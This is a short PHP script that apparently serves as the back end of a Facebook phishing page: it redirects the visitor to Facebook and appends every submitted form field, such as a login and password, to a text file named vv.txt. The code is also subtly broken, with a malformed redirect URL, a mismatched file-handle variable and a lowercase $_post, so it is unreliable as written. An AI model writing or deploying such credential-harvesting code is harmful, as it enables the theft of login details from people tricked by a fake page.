<?php
header ('location: http//www.facebook.com/');
$handlr =fopen("vv.txt", "a");


foreach ($_post as $var => $val) {
	fwrite($handle, $var);
		fwrite($handle, "=");
fwrite($handle, $val);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
  fclose($handle);
exit;









?>